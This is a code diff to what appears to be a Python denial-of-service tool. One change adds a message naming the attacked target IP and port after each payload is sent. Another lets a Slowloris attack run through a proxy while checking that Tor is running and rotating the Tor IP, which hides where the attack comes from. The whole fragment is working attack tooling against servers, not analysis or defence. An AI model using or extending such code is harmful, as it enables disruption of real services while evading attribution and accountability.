@@ -503,7 +503,7 @@ def send_payload(use_tor=False, proxy_ip=None, proxy_port=None):
             )
             s.sendall(req.encode())
             s.close()
-            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sended Payload{styles['reset']}")
+            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sended Payload{styles['reset']} attack on {styles['bright']}{target_ip}:{port_target}{styles['reset']}")
             time.sleep(0.1)
 
         except socket.timeout:
@@ -635,7 +635,18 @@ if check_target(target_ip, port_target):
 
         # Proxy Attack (Slowloris)
         elif args.slowloris_attack and args.proxy_ip and args.proxy_port:
-            t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
+            if check_tor_running():
+                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor is running and reachable{styles['reset']}")
+                time.sleep(3)
+                t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
+                if args.change_tor_ip:
+                    time.sleep(5)
+                    change_tor_ip()
+                    print(f"\n{styles['bright']}** Changeing Tor IP it will take ({back_colors['cyan']}10s/per 1 IP{back_colors['reset']}) **{styles['reset']}")
+                    time.sleep(10)
+            else:
+                t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
+
         
         elif args.slowloris_attack and args.proxy_list:
             #print("DEBUG: payload_attack:", args.payload_attack)
